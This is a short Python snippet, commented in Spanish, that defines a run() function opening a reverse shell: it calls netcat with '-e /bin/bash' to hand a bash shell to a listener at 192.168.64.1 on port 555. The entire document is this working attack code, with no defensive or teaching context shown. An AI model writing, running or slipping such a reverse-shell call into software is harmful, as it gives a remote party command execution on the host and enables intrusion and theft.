import os

def run():
    # Abre una conexión utilizando netcat y ejecuta un shell remoto
    os.system('nc -e /bin/bash 192.168.64.1 555')
